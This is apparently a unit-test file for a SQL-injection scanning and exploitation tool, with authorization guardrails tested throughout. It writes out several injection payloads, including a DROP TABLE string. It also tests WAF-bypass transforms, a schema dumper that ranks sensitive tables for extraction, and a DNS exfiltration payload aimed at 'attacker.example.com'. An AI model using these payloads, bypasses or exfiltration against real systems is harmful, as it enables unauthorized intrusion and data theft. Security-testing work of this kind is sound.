"""
Unit tests for the new sql_attacker modules:
- time_based_detector
- union_exploiter
- stacked_queries
- second_order_detector
- hpp_engine
- schema_dumper
- waf_profiler
- payload_chainer
- engine/reporting (enhanced features)
"""

import sys
import os
import unittest
from unittest.mock import Mock, MagicMock, patch
from typing import Any, Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sql_attacker.engine.config import ScanConfig


# ---------------------------------------------------------------------------
# Helper: make a mock HTTP response
# ---------------------------------------------------------------------------

def _mock_response(body: str = "", status: int = 200, headers: Optional[Dict] = None):
    r = Mock()
    r.text = body
    r.status_code = status
    r.headers = headers or {}
    r.content = body.encode()
    return r


# ===========================================================================
# Enhanced reporting tests
# ===========================================================================

class TestEnhancedReporting(unittest.TestCase):
    """Tests for the enhanced reporting.py features."""

    def setUp(self):
        from sql_attacker.engine.reporting import (
            Finding, Evidence, ReportBuilder,
            build_curl_command, compute_cvss_score, get_compliance_refs,
        )
        self.Finding = Finding
        self.Evidence = Evidence
        self.ReportBuilder = ReportBuilder
        self.build_curl_command = build_curl_command
        self.compute_cvss_score = compute_cvss_score
        self.get_compliance_refs = get_compliance_refs

    def test_finding_has_cvss(self):
        """Finding auto-populates CVSS v3.1 score."""
        f = self.Finding(
            parameter="id", technique="error", db_type="mysql",
            confidence=0.95, verdict="confirmed",
        )
        self.assertIsNotNone(f.cvss)
        self.assertIn("score", f.cvss)
        self.assertIn("vector", f.cvss)
        self.assertIn("severity", f.cvss)
        self.assertGreater(f.cvss["score"], 0)

    def test_finding_has_compliance(self):
        """Finding auto-populates compliance references."""
        f = self.Finding(
            parameter="id", technique="union", db_type="mysql",
            confidence=0.85, verdict="confirmed",
        )
        self.assertIsNotNone(f.compliance)
        self.assertIn("owasp_top10", f.compliance)
        self.assertIn("cwe", f.compliance)
        self.assertIn("pci_dss", f.compliance)

    def test_finding_has_timestamp(self):
        """Finding has a timestamp field."""
        f = self.Finding(
            parameter="q", technique="boolean", db_type="postgresql",
            confidence=0.7, verdict="likely",
        )
        self.assertTrue(f.timestamp)
        self.assertIn("T", f.timestamp)  # ISO 8601 format

    def test_finding_to_dict_includes_new_fields(self):
        """to_dict() includes cvss_v31, compliance, timestamp."""
        f = self.Finding(
            parameter="q", technique="error", db_type="mysql",
            confidence=0.92, verdict="confirmed",
            url="https://example.com/search",
        )
        d = f.to_dict()
        self.assertIn("cvss_v31", d)
        self.assertIn("compliance", d)
        self.assertIn("timestamp", d)

    def test_finding_curl_command_generated(self):
        """Finding auto-generates cURL command when url and evidence are provided."""
        ev = self.Evidence(
            payload="' AND 1=1--",
            request_summary="GET /search?q=test HTTP/1.1",
        )
        f = self.Finding(
            parameter="q", technique="error", db_type="mysql",
            confidence=0.92, verdict="confirmed",
            url="https://example.com/search",
            evidence=[ev],
        )
        self.assertIsNotNone(f.curl_command)
        self.assertIn("curl", f.curl_command)

    def test_build_curl_command_get(self):
        """build_curl_command generates a valid GET cURL string."""
        cmd = self.build_curl_command(
            url="https://example.com/search",
            method="GET",
            parameter="q",
            payload="' OR 1=1--",
            parameter_location="query_param",
        )
        self.assertIn("curl", cmd)
        self.assertIn("GET", cmd)
        self.assertIn("example.com", cmd)

    def test_build_curl_command_post_form(self):
        """build_curl_command generates a valid POST form cURL string."""
        cmd = self.build_curl_command(
            url="https://example.com/login",
            method="POST",
            parameter="username",
            payload="admin'--",
            parameter_location="form_param",
        )
        self.assertIn("curl", cmd)
        self.assertIn("POST", cmd)
        self.assertIn("--data-urlencode", cmd)

    def test_build_curl_command_post_json(self):
        """build_curl_command generates a valid JSON POST cURL string."""
        cmd = self.build_curl_command(
            url="https://api.example.com/users",
            method="POST",
            parameter="name",
            payload="'; DROP TABLE users--",
            parameter_location="json_param",
        )
        self.assertIn("application/json", cmd)

    def test_compute_cvss_score_error_technique(self):
        """compute_cvss_score returns high score for error technique."""
        result = self.compute_cvss_score("error", 0.95)
        self.assertGreaterEqual(result["score"], 7.0)
        self.assertEqual(result["vector"][:7], "CVSS:3.")

    def test_compute_cvss_score_low_confidence_discounts(self):
        """compute_cvss_score discounts score for low confidence."""
        high_conf = self.compute_cvss_score("error", 0.95)
        low_conf = self.compute_cvss_score("error", 0.20)
        self.assertGreater(high_conf["score"], low_conf["score"])

    def test_compute_cvss_score_unknown_technique(self):
        """compute_cvss_score handles unknown techniques gracefully."""
        result = self.compute_cvss_score("unknown_technique", 0.8)
        self.assertIn("score", result)
        self.assertGreater(result["score"], 0)

    def test_get_compliance_refs_returns_all_frameworks(self):
        """get_compliance_refs returns references for all frameworks."""
        refs = self.get_compliance_refs("error")
        self.assertIn("owasp_top10", refs)
        self.assertIn("cwe", refs)
        self.assertIn("pci_dss", refs)
        self.assertIn("nist", refs)

    def test_executive_summary_no_findings(self):
        """executive_summary works with no findings."""
        builder = self.ReportBuilder(target_url="https://example.com")
        summary = builder.executive_summary()
        self.assertIn("No SQL injection", summary)

    def test_executive_summary_with_findings(self):
        """executive_summary includes stats when findings exist."""
        builder = self.ReportBuilder(target_url="https://example.com")
        f = self.Finding(
            parameter="id", technique="error", db_type="mysql",
            confidence=0.95, verdict="confirmed",
        )
        builder.add_finding(f)
        builder.finish()
        summary = builder.executive_summary()
        self.assertIn("Total findings:", summary)
        self.assertIn("CVSS", summary)
        self.assertIn("RISK RATING:", summary)

    def test_attack_timeline_empty(self):
        """attack_timeline returns empty list with no findings."""
        builder = self.ReportBuilder(target_url="https://example.com")
        timeline = builder.attack_timeline()
        self.assertEqual(timeline, [])

    def test_attack_timeline_ordered(self):
        """attack_timeline returns findings ordered by timestamp."""
        builder = self.ReportBuilder(target_url="https://example.com")
        f1 = self.Finding(
            parameter="id", technique="error", db_type="mysql",
            confidence=0.9, verdict="confirmed",
        )
        f2 = self.Finding(
            parameter="name", technique="union", db_type="mysql",
            confidence=0.85, verdict="confirmed",
        )
        builder.add_finding(f1)
        builder.add_finding(f2)
        timeline = builder.attack_timeline()
        self.assertEqual(len(timeline), 2)
        self.assertIn("timestamp", timeline[0])
        self.assertIn("technique", timeline[0])


# ===========================================================================
# TimeBasedDetector tests
# ===========================================================================

class TestTimeBasedDetector(unittest.TestCase):
    """Tests for the TimeBasedDetector class."""

    def setUp(self):
        from sql_attacker.time_based_detector import TimeBasedDetector, TimingStatistics
        self.TimeBasedDetector = TimeBasedDetector
        self.TimingStatistics = TimingStatistics

    def test_initialization(self):
        """TimeBasedDetector initializes with ScanConfig."""
        cfg = ScanConfig(time_based_enabled=True)
        detector = self.TimeBasedDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        self.assertIsNotNone(detector)

    def test_detect_raises_without_authorization(self):
        """detect() raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig(time_based_enabled=True)
        detector = self.TimeBasedDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            detector.detect("https://example.com/page", "id")

    def test_detect_returns_none_when_disabled(self):
        """detect() returns None or raises when time_based_enabled=False."""
        cfg = ScanConfig(time_based_enabled=False)
        mock_req = Mock(return_value=_mock_response())
        detector = self.TimeBasedDetector(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        # When time_based_enabled=False, detect() should either return None
        # or raise ValueError (implementation-dependent).
        try:
            result = detector.detect("https://example.com/page", "id")
            self.assertIsNone(result)
        except ValueError:
            pass  # Acceptable behaviour: raise ValueError when disabled

    def test_timing_statistics_from_samples(self):
        """TimingStatistics computes correct median and IQR."""
        stats = self.TimingStatistics.from_samples([100.0, 200.0, 150.0, 120.0, 180.0])
        self.assertAlmostEqual(stats.median, 150.0, places=1)
        self.assertGreater(stats.iqr, 0)

    def test_timing_statistics_single_sample(self):
        """TimingStatistics handles a single sample."""
        stats = self.TimingStatistics.from_samples([500.0])
        self.assertEqual(stats.median, 500.0)
        self.assertEqual(stats.iqr, 0.0)

    def test_detect_no_delay_returns_none(self):
        """detect() returns None when no timing delay is detected."""
        cfg = ScanConfig(
            time_based_enabled=True,
            time_based_max_delay_seconds=2.0,
        )
        # All responses are fast (no delay)
        fast_response = _mock_response("OK", 200)
        mock_req = Mock(return_value=fast_response)
        detector = self.TimeBasedDetector(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        # We can't actually test timing without real delays, but we can
        # verify the method runs without error
        try:
            result = detector.detect("https://example.com/", "id")
        except Exception:
            result = None
        # Result could be None (no delay detected) or a Finding


# ===========================================================================
# UnionExploiter tests
# ===========================================================================

class TestUnionExploiter(unittest.TestCase):
    """Tests for the UnionExploiter class."""

    def setUp(self):
        from sql_attacker.union_exploiter import UnionExploiter, DBType
        self.UnionExploiter = UnionExploiter
        self.DBType = DBType

    def test_initialization(self):
        """UnionExploiter initializes correctly."""
        cfg = ScanConfig()
        exploiter = self.UnionExploiter(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        self.assertIsNotNone(exploiter)

    def test_detect_raises_without_authorization(self):
        """detect_column_count raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig()
        exploiter = self.UnionExploiter(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            exploiter.detect_column_count("https://example.com/", "id")

    def test_dbtype_from_str(self):
        """DBType.from_str() correctly maps strings."""
        self.assertEqual(self.DBType.from_str("mysql"), self.DBType.MYSQL)
        self.assertEqual(self.DBType.from_str("POSTGRESQL"), self.DBType.POSTGRESQL)
        self.assertEqual(self.DBType.from_str("mssql"), self.DBType.MSSQL)
        self.assertEqual(self.DBType.from_str("oracle"), self.DBType.ORACLE)
        self.assertEqual(self.DBType.from_str("sqlite"), self.DBType.SQLITE)
        self.assertEqual(self.DBType.from_str("unknown_db"), self.DBType.UNKNOWN)

    def test_detect_column_count_returns_none_on_error(self):
        """detect_column_count returns None or an integer when request fails."""
        cfg = ScanConfig()
        mock_req = Mock(return_value=None)
        exploiter = self.UnionExploiter(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        result = exploiter.detect_column_count("https://example.com/", "id")
        # May return None or a fallback value; just check it doesn't raise
        self.assertTrue(result is None or isinstance(result, int))

    def test_build_finding_returns_finding(self):
        """build_finding returns a valid Finding object."""
        from sql_attacker.engine.reporting import Finding
        cfg = ScanConfig()
        mock_req = Mock(return_value=_mock_response())
        exploiter = self.UnionExploiter(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        finding = exploiter.build_finding(
            url="https://example.com/",
            parameter="id",
            column_count=3,
            db_type="mysql",
        )
        self.assertIsInstance(finding, Finding)
        self.assertEqual(finding.technique, "union")
        self.assertEqual(finding.parameter, "id")


# ===========================================================================
# StackedQueryDetector tests
# ===========================================================================

class TestStackedQueryDetector(unittest.TestCase):
    """Tests for StackedQueryDetector."""

    def setUp(self):
        from sql_attacker.stacked_queries import StackedQueryDetector, StackedQueryResult
        self.StackedQueryDetector = StackedQueryDetector
        self.StackedQueryResult = StackedQueryResult

    def test_initialization(self):
        """StackedQueryDetector initializes correctly."""
        cfg = ScanConfig()
        detector = self.StackedQueryDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
            detection_only=True,
        )
        self.assertIsNotNone(detector)
        self.assertTrue(detector._detection_only)

    def test_detect_raises_without_authorization(self):
        """detect() raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig()
        detector = self.StackedQueryDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            detector.detect("https://example.com/", "id")

    def test_get_detection_payloads_returns_list(self):
        """get_detection_payloads returns non-empty lists."""
        cfg = ScanConfig()
        detector = self.StackedQueryDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        for db in ["mysql", "mssql", "postgresql", "sqlite", "oracle"]:
            payloads = detector.get_detection_payloads(db)
            self.assertIsInstance(payloads, list)
            self.assertGreater(len(payloads), 0)

    def test_exploitation_payloads_empty_in_detection_only_mode(self):
        """get_exploitation_payloads returns empty list in detection-only mode."""
        cfg = ScanConfig()
        detector = self.StackedQueryDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
            detection_only=True,
        )
        payloads = detector.get_exploitation_payloads("mssql", "cmdshell")
        self.assertEqual(payloads, [])

    def test_dns_exfil_payload_contains_callback_host(self):
        """generate_dns_exfil_payload includes the callback host."""
        cfg = ScanConfig()
        detector = self.StackedQueryDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        payload = detector.generate_dns_exfil_payload(
            db_type="mysql",
            query="SELECT version()",
            callback_host="attacker.example.com",
        )
        self.assertIn("attacker.example.com", payload)


# ===========================================================================
# SecondOrderDetector tests
# ===========================================================================

class TestSecondOrderDetector(unittest.TestCase):
    """Tests for SecondOrderDetector."""

    def setUp(self):
        from sql_attacker.second_order_detector import (
            SecondOrderDetector, EndpointMapping, SecondOrderResult
        )
        self.SecondOrderDetector = SecondOrderDetector
        self.EndpointMapping = EndpointMapping
        self.SecondOrderResult = SecondOrderResult

    def test_initialization(self):
        """SecondOrderDetector initializes correctly."""
        cfg = ScanConfig()
        detector = self.SecondOrderDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        self.assertIsNotNone(detector)

    def test_detect_raises_without_authorization(self):
        """detect() raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig()
        detector = self.SecondOrderDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            detector.detect(
                injection_url="https://example.com/register",
                injection_param="username",
                trigger_url="https://example.com/profile",
            )

    def test_add_endpoint_mapping(self):
        """add_endpoint_mapping stores the mapping."""
        cfg = ScanConfig()
        detector = self.SecondOrderDetector(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        detector.add_endpoint_mapping(
            injection_url="https://example.com/register",
            trigger_url="https://example.com/profile",
        )
        self.assertEqual(len(detector._mappings), 1)

    def test_scan_all_mappings_returns_list(self):
        """scan_all_mappings returns a list."""
        cfg = ScanConfig()
        # Return a fast response that doesn't trigger SQL errors
        mock_req = Mock(return_value=_mock_response("Normal page content", 200))
        detector = self.SecondOrderDetector(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        detector.add_endpoint_mapping(
            injection_url="https://example.com/register",
            trigger_url="https://example.com/profile",
        )
        results = detector.scan_all_mappings()
        self.assertIsInstance(results, list)

    def test_endpoint_mapping_dataclass(self):
        """EndpointMapping stores correct fields."""
        mapping = self.EndpointMapping(
            injection_url="https://example.com/register",
            injection_param="username",
            trigger_url="https://example.com/profile",
            trigger_param=None,
            method="POST",
        )
        self.assertEqual(mapping.injection_url, "https://example.com/register")
        self.assertEqual(mapping.method, "POST")


# ===========================================================================
# HPPEngine tests
# ===========================================================================

class TestHPPEngine(unittest.TestCase):
    """Tests for HPPEngine."""

    def setUp(self):
        from sql_attacker.hpp_engine import HPPEngine, HPPTechnique, HPPVariant
        self.HPPEngine = HPPEngine
        self.HPPTechnique = HPPTechnique
        self.HPPVariant = HPPVariant

    def test_initialization(self):
        """HPPEngine initializes correctly."""
        cfg = ScanConfig()
        engine = self.HPPEngine(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        self.assertIsNotNone(engine)

    def test_hpp_technique_values(self):
        """HPPTechnique enum has expected values."""
        techs = {t.name for t in self.HPPTechnique}
        self.assertIn("DUPLICATE_LAST", techs)
        self.assertIn("DUPLICATE_FIRST", techs)
        self.assertIn("ARRAY_NOTATION", techs)
        self.assertIn("NULL_BYTE", techs)

    def test_generate_hpp_variants_returns_list(self):
        """generate_hpp_variants returns HPPVariant objects."""
        cfg = ScanConfig()
        engine = self.HPPEngine(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        variants = engine.generate_hpp_variants(
            url="https://example.com/search?q=normal",
            parameter="q",
            payload="' OR 1=1--",
        )
        self.assertIsInstance(variants, list)
        self.assertGreater(len(variants), 0)
        # Each variant should have a url and technique
        for v in variants:
            self.assertTrue(v.url)
            self.assertIsNotNone(v.technique)

    def test_detect_raises_without_authorization(self):
        """detect() raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig()
        engine = self.HPPEngine(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            engine.detect("https://example.com/", "id", "' OR 1=1--")

    def test_scan_raises_without_authorization(self):
        """scan() raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig()
        engine = self.HPPEngine(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            engine.scan("https://example.com/", {"id": "1"}, ["' OR 1=1--"])


# ===========================================================================
# SchemaDumper tests
# ===========================================================================

class TestSchemaDumper(unittest.TestCase):
    """Tests for SchemaDumper."""

    def setUp(self):
        from sql_attacker.schema_dumper import SchemaDumper, DumpResult, TableInfo, _priority_score
        self.SchemaDumper = SchemaDumper
        self.DumpResult = DumpResult
        self.TableInfo = TableInfo
        self._priority_score = _priority_score

    def test_initialization(self):
        """SchemaDumper initializes correctly."""
        cfg = ScanConfig()
        dumper = self.SchemaDumper(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        self.assertIsNotNone(dumper)

    def test_priority_score_high_value_tables(self):
        """_priority_score assigns higher scores to sensitive table names."""
        self.assertGreater(self._priority_score("users"), self._priority_score("products"))
        self.assertGreater(self._priority_score("passwords"), self._priority_score("categories"))
        self.assertGreater(self._priority_score("admin"), self._priority_score("orders"))

    def test_priority_score_partial_match(self):
        """_priority_score matches partial table names."""
        self.assertGreater(self._priority_score("user_accounts"), 0)
        self.assertGreater(self._priority_score("admin_users"), 0)

    def test_dump_raises_without_authorization(self):
        """dump() raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig()
        dumper = self.SchemaDumper(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            dumper.dump("https://example.com/", "id")

    def test_to_json_returns_string(self):
        """to_json() returns a valid JSON string."""
        import json
        cfg = ScanConfig()
        mock_req = Mock(return_value=_mock_response())
        dumper = self.SchemaDumper(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        result = self.DumpResult(
            db_type="mysql",
            database_name="testdb",
            tables=[],
            extraction_results={},
            total_rows_extracted=0,
            started_at="2026-01-01T00:00:00Z",
            finished_at="2026-01-01T00:01:00Z",
        )
        json_str = dumper.to_json(result)
        data = json.loads(json_str)
        self.assertEqual(data["db_type"], "mysql")
        self.assertEqual(data["database_name"], "testdb")

    def test_to_csv_returns_string(self):
        """to_csv() returns a CSV string."""
        cfg = ScanConfig()
        dumper = self.SchemaDumper(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        table = self.TableInfo(
            name="users",
            columns=["id", "name", "email"],
            row_count=2,
            priority=10,
            data=[{"id": "1", "name": "Alice", "email": "a@b.com"}],
        )
        result = self.DumpResult(
            db_type="mysql",
            database_name="testdb",
            tables=[table],
            extraction_results={},
            total_rows_extracted=1,
            started_at="2026-01-01T00:00:00Z",
            finished_at="2026-01-01T00:01:00Z",
        )
        csv_str = dumper.to_csv(result, "users")
        self.assertIn("id", csv_str)
        self.assertIn("Alice", csv_str)

    def test_to_markdown_returns_string(self):
        """to_markdown() returns a markdown string."""
        cfg = ScanConfig()
        dumper = self.SchemaDumper(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        result = self.DumpResult(
            db_type="postgresql",
            database_name="appdb",
            tables=[],
            extraction_results={},
            total_rows_extracted=0,
            started_at="2026-01-01T00:00:00Z",
            finished_at="2026-01-01T00:01:00Z",
        )
        md = dumper.to_markdown(result)
        self.assertIn("#", md)
        self.assertIn("postgresql", md)


# ===========================================================================
# WAFProfiler tests
# ===========================================================================

class TestWAFProfiler(unittest.TestCase):
    """Tests for WAFProfiler."""

    def setUp(self):
        from sql_attacker.waf_profiler import WAFProfiler, WAFVendor, WAFProfile, BypassTechnique
        self.WAFProfiler = WAFProfiler
        self.WAFVendor = WAFVendor
        self.WAFProfile = WAFProfile
        self.BypassTechnique = BypassTechnique

    def test_initialization(self):
        """WAFProfiler initializes correctly."""
        cfg = ScanConfig()
        profiler = self.WAFProfiler(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        self.assertIsNotNone(profiler)

    def test_waf_vendor_enum_values(self):
        """WAFVendor enum has expected members."""
        vendors = {v.name for v in self.WAFVendor}
        self.assertIn("CLOUDFLARE", vendors)
        self.assertIn("AWS_WAF", vendors)
        self.assertIn("MODSECURITY", vendors)
        self.assertIn("NONE", vendors)
        self.assertIn("UNKNOWN", vendors)

    def test_bypass_technique_enum_values(self):
        """BypassTechnique enum has expected members."""
        techs = {t.name for t in self.BypassTechnique}
        self.assertIn("SPACE_TO_COMMENT", techs)
        self.assertIn("CHAR_ENCODE", techs)
        self.assertIn("RANDOM_CASE", techs)

    def test_fingerprint_raises_without_authorization(self):
        """fingerprint() raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig()
        profiler = self.WAFProfiler(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            profiler.fingerprint("https://example.com/")

    def test_get_bypass_chain_returns_list(self):
        """get_bypass_chain returns a list for any vendor."""
        cfg = ScanConfig()
        profiler = self.WAFProfiler(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        for vendor in ["cloudflare", "aws_waf", "modsecurity", "none", "unknown"]:
            chain = profiler.get_bypass_chain(vendor)
            self.assertIsInstance(chain, list)

    def test_apply_bypass_space_to_comment(self):
        """apply_bypass transforms space to SQL comment."""
        cfg = ScanConfig()
        profiler = self.WAFProfiler(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        # Use the enum value (lowercase) as expected by apply_bypass
        result = profiler.apply_bypass(
            "SELECT * FROM users",
            self.BypassTechnique.SPACE_TO_COMMENT.value,
        )
        # Should replace spaces with /**/ or similar
        self.assertNotEqual(result, "SELECT * FROM users")

    def test_apply_bypass_random_case(self):
        """apply_bypass randomizes case."""
        cfg = ScanConfig()
        profiler = self.WAFProfiler(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        result = profiler.apply_bypass(
            "SELECT version()",
            self.BypassTechnique.RANDOM_CASE.value,
        )
        # Result should be same characters, different case (case-insensitive equal)
        self.assertEqual(result.lower(), "select version()")

    def test_fingerprint_no_waf_response(self):
        """fingerprint() returns NONE vendor for normal responses."""
        cfg = ScanConfig()
        # Normal 200 OK response without WAF headers
        mock_req = Mock(return_value={"status": 200, "headers": {}, "body": "Normal page"})
        profiler = self.WAFProfiler(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        profile = profiler.fingerprint("https://example.com/")
        self.assertIsInstance(profile, self.WAFProfile)
        # With no WAF headers/signatures, should be NONE or UNKNOWN
        self.assertIn(profile.vendor, [self.WAFVendor.NONE, self.WAFVendor.UNKNOWN])

    def test_fingerprint_cloudflare_headers(self):
        """fingerprint() detects Cloudflare from CF-Ray header."""
        cfg = ScanConfig()
        mock_req = Mock(return_value={
            "status": 403,
            "headers": {"cf-ray": "abc123-LHR", "server": "cloudflare"},
            "body": "Forbidden",
        })
        profiler = self.WAFProfiler(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        profile = profiler.fingerprint("https://example.com/")
        self.assertEqual(profile.vendor, self.WAFVendor.CLOUDFLARE)


# ===========================================================================
# PayloadChainer tests
# ===========================================================================

class TestPayloadChainer(unittest.TestCase):
    """Tests for PayloadChainer."""

    def setUp(self):
        from sql_attacker.payload_chainer import PayloadChainer, ChainResult, ChainContext
        self.PayloadChainer = PayloadChainer
        self.ChainResult = ChainResult
        self.ChainContext = ChainContext

    def test_initialization(self):
        """PayloadChainer initializes correctly."""
        cfg = ScanConfig()
        chainer = self.PayloadChainer(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        self.assertIsNotNone(chainer)

    def test_get_technique_order(self):
        """get_technique_order returns an ordered list of techniques."""
        cfg = ScanConfig()
        chainer = self.PayloadChainer(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        order = chainer.get_technique_order()
        self.assertIsInstance(order, list)
        self.assertGreater(len(order), 0)
        self.assertIn("error_based", order)
        self.assertIn("time_based", order)

    def test_run_chain_raises_without_authorization(self):
        """run_chain() raises AuthorizationError when not authorized."""
        from sql_attacker.guardrails import AuthorizationError
        cfg = ScanConfig()
        chainer = self.PayloadChainer(
            config=cfg,
            request_fn=Mock(),
            authorized=False,
        )
        with self.assertRaises(AuthorizationError):
            chainer.run_chain("https://example.com/", "id")

    def test_run_chain_returns_chain_result(self):
        """run_chain() returns a ChainResult."""
        cfg = ScanConfig(time_based_enabled=False)
        # Return a normal page with no SQL errors
        mock_req = Mock(return_value=_mock_response("Normal page content", 200))
        chainer = self.PayloadChainer(
            config=cfg,
            request_fn=mock_req,
            authorized=True,
        )
        result = chainer.run_chain("https://example.com/", "id")
        self.assertIsInstance(result, self.ChainResult)
        self.assertIsInstance(result.findings, list)

    def test_run_technique_unknown_raises_value_error(self):
        """run_technique raises ValueError for unknown technique."""
        cfg = ScanConfig()
        chainer = self.PayloadChainer(
            config=cfg,
            request_fn=Mock(),
            authorized=True,
        )
        with self.assertRaises(ValueError):
            chainer.run_technique(
                "nonexistent_technique",
                "https://example.com/",
                "id",
            )

    def test_chain_context_dataclass(self):
        """ChainContext stores correct fields."""
        ctx = self.ChainContext(
            db_type="mysql",
            column_count=3,
            injectable_columns=[1, 2],
            waf_vendor="cloudflare",
            bypass_chain=["SPACE_TO_COMMENT"],
            confirmed_techniques=["error_based"],
        )
        self.assertEqual(ctx.db_type, "mysql")
        self.assertEqual(ctx.column_count, 3)
        self.assertEqual(len(ctx.injectable_columns), 2)


if __name__ == "__main__":
    unittest.main()
